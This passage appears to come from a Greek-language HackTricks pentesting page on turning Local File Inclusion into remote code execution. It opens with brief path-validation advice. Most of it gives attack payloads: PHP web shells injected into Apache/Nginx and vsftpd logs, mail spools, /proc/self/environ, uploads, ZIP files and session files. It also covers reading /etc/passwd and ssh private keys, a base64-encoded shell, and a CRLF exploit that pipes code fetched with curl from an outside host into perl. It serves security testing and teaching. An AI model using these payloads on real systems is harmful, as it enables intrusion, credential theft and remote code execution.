- Επιλύστε σε canonical path και επιβάλετε ότι είναι απόγονος ενός allow-listed base directory.
- Απορρίψτε οποιοδήποτε path που περιέχει `..`, absolute roots, ή drive letters· προτιμήστε generated filenames.
- Τρέξτε τον writer ως low-privileged account και διαχωρίστε τους write directories από τα served roots.

## Remote File Inclusion

Explained previously, [**follow this link**](#remote-file-inclusion).

### Μέσω Apache/Nginx log file

Εάν ο Apache ή ο Nginx server είναι **ευάλωτος σε LFI** μέσα στην include function μπορείτε να προσπαθήσετε να αποκτήσετε πρόσβαση στο **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, να βάλετε μέσα στο **user agent** ή σε ένα **GET parameter** ένα php shell όπως **`<?php system($_GET['c']); ?>`** και να συμπεριλάβετε αυτό το αρχείο

> [!WARNING]
> Σημειώστε ότι **εάν χρησιμοποιήσετε double quotes** για το shell αντί για **simple quotes**, τα double quotes θα τροποποιηθούν στη συμβολοσειρά "_**quote;**_", **PHP θα ρίξει σφάλμα** και **τίποτε άλλο δεν θα εκτελεστεί**.
>
> Επίσης, βεβαιωθείτε ότι **γράφετε σωστά το payload** αλλιώς η PHP θα εμφανίζει σφάλμα κάθε φορά που προσπαθεί να φορτώσει το log file και δεν θα έχετε δεύτερη ευκαιρία.

Αυτό μπορεί επίσης να γίνει σε άλλα logs αλλά **πρόσεχε,** ο κώδικας μέσα στα logs μπορεί να είναι URL encoded και αυτό μπορεί να καταστρέψει το Shell. Το header **authorisation "basic"** περιέχει "user:password" σε Base64 και αποκωδικοποιείται μέσα στα logs. Το PHPShell μπορεί να εισαχθεί μέσα σε αυτό το header.\
Other possible log paths:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Μέσω Email

**Στείλε ένα mail** σε έναν εσωτερικό λογαριασμό (user@localhost) που περιέχει το PHP payload σου όπως `<?php echo system($_REQUEST["cmd"]); ?>` και προσπάθησε να κάνεις include το mail του χρήστη με διαδρομή όπως **`/var/mail/<USERNAME>`** ή **`/var/spool/mail/<USERNAME>`**

### Μέσω /proc/\*/fd/\*

1. Ανέβασε πολλά shells (π.χ.: 100)
2. Κάνε include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), με $PID = PID της διεργασίας (μπορεί να βρεθεί με brute force) και $FD το file descriptor (μπορεί επίσης να βρεθεί με brute force)

### Μέσω /proc/self/environ

Όπως ένα αρχείο καταγραφής, στείλε το payload στο User-Agent, θα αντικατοπτριστεί μέσα στο αρχείο /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Via upload

Αν μπορείς να upload ένα αρχείο, απλώς inject το shell payload σε αυτό (e.g : `<?php system($_GET['c']); ?>` ).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Για να διατηρηθεί το αρχείο αναγνώσιμο, είναι καλύτερο να ενσωματωθεί στα μεταδεδομένα των εικόνων/doc/pdf

### Μέσω ZIP file upload

Ανεβάστε ένα ZIP αρχείο που περιέχει ένα συμπιεσμένο PHP shell και αποκτήστε πρόσβαση:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Μέσω PHP sessions

Ελέγξτε αν ο ιστότοπος χρησιμοποιεί PHP Session (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
Στο PHP αυτές οι συνεδρίες αποθηκεύονται σε αρχεία _/var/lib/php5/sess\\_\[PHPSESSID]\_
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Ορίστε το cookie σε `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Χρησιμοποίησε το LFI για να συμπεριλάβεις το PHP session file
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Μέσω ssh

Αν το ssh είναι ενεργό, ελέγξτε ποιος χρήστης χρησιμοποιείται (/proc/self/status & /etc/passwd) και προσπαθήστε να αποκτήσετε πρόσβαση στο **\<HOME>/.ssh/id_rsa**

### **Μέσω** **vsftpd** _**logs**_

Τα logs του FTP server vsftpd βρίσκονται στο _**/var/log/vsftpd.log**_. Στην περίπτωση όπου υπάρχει ευπάθεια Local File Inclusion (LFI) και είναι δυνατή η πρόσβαση σε έναν εκτεθειμένο vsftpd server, μπορούν να θεωρηθούν οι ακόλουθες ενέργειες:

1. Εισάγετε ένα PHP payload στο πεδίο username κατά τη διαδικασία σύνδεσης.
2. Μετά την έγχυση, χρησιμοποιήστε το LFI για να ανακτήσετε τα server logs από _**/var/log/vsftpd.log**_.

### Μέσω php base64 filter (using base64)

Όπως φαίνεται στο [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) άρθρο, το PHP base64 filter αγνοεί τους μη-base64 χαρακτήρες. Μπορείτε να το χρησιμοποιήσετε για να παρακάμψετε τον έλεγχο επέκτασης αρχείου: αν παρέχετε base64 που τελειώνει με ".php", θα αγνοήσει το "." και θα προσθέσει "php" στο base64. Εδώ ένα παράδειγμα payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Μέσω php filters (δεν απαιτείται αρχείο)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)εξηγεί ότι μπορείτε να χρησιμοποιήσετε **php filters για να δημιουργήσετε αυθαίρετο περιεχόμενο** ως έξοδο. Το οποίο ουσιαστικά σημαίνει ότι μπορείτε να **generate arbitrary php code** για το include **χωρίς να χρειαστεί να το γράψετε** σε αρχείο.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Μέσω segmentation fault

**Μεταφορτώστε** ένα αρχείο που θα αποθηκευτεί ως **προσωρινό** στο `/tmp`, στη συνέχεια στην **ίδια αίτηση,** προκαλέστε ένα **segmentation fault**, και τότε το **προσωρινό αρχείο δεν θα διαγραφεί** και μπορείτε να το αναζητήσετε.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Μέσω Nginx αποθήκευσης προσωρινών αρχείων

If you found a **Local File Inclusion** and **Nginx** is running in front of PHP you might be able to obtain RCE with the following technique:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Μέσω PHP_SESSION_UPLOAD_PROGRESS

If you found a **Local File Inclusion** even if you **don't have a session** and `session.auto_start` is `Off`. If you provide the **`PHP_SESSION_UPLOAD_PROGRESS`** in **multipart POST** data, PHP will **enable the session for you**. You could abuse this to get RCE:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Μέσω temp file uploads σε Windows

If you found a **Local File Inclusion** and and the server is running in **Windows** you might get RCE:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Μέσω `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), the script `/usr/local/lib/phppearcmd.php` exists by default in php docker images. Moreover, it's possible to pass arguments to the script via the URL because it's indicated that if a URL param doesn't have an `=`, it should be used as an argument. See also [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) and [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

The following request create a file in `/tmp/hello.php` with the content `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Το ακόλουθο εκμεταλλεύεται μια CRLF vuln για να αποκτήσει RCE (από [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Μέσω phpinfo() (file_uploads = on)

Εάν βρήκατε μια **Local File Inclusion** και ένα αρχείο που εκθέτει **phpinfo()** με file_uploads = on, μπορείτε να αποκτήσετε RCE:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Μέσω compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Εάν βρήκατε μια **Local File Inclusion** και μπορείτε να **exfiltrate the path** του προσωρινού αρχείου ΑΛΛΑ ο **server** ελέγχει αν το **αρχείο που θα συμπεριληφθεί έχει PHP marks**, μπορείτε να δοκιμάσετε να **bypass that check** με αυτή την **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Μέσω eternal waiting + bruteforce

Εάν μπορείτε να εκμεταλλευτείτε το LFI για να **upload temporary files** και να κάνετε τον **server** να **hang** την εκτέλεση του PHP, θα μπορούσατε στη συνέχεια να **brute force filenames during hours** για να βρείτε το προσωρινό αρχείο:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Σε Fatal Error

Αν συμπεριλάβετε κάποιο από τα αρχεία `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Πρέπει να συμπεριλάβετε το ίδιο μία 2 φορές για να προκαλέσετε αυτό το σφάλμα).

**Δεν ξέρω πόσο χρήσιμο είναι αυτό αλλά μπορεί να είναι.**\
_Ακόμα και αν προκαλέσετε ένα PHP Fatal Error, τα PHP προσωρινά αρχεία που ανέβηκαν διαγράφονται._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>

## References

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
